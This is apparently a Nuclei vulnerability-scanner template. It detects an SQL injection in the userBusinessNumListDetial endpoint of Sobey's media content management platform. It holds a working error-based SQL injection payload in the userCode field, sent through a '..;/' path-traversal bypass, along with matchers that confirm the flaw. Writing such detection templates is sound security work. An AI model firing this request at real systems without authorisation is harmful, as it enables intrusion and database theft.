id: sobey-imcmp-userbusinessnumlistdetial-sqli
info:
  name: Sobey Integrated Media Content Management userBusinessNumListDetial SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    Detects an SQL injection vulnerability in the Sobey Integrated Media Content Management platform's userBusinessNumListDetial endpoint.

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: POST
    path:
      - "{{BaseURL}}/sobey-mchEditor/js/..;/mch/Jzt/Business/userBusinessNumListDetial"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      endTime=1&siteCode=&startTime=10&token=&userCode='+AND+GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(1709=1709,md5({{t1}})))),0x7e),1709)+AND+'bckN'='bckN&userName=

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "Sobey"
          - ".userBusinessNumListDetial"
          - "java.sql.SQLException"
          - "~{{t2}}~"
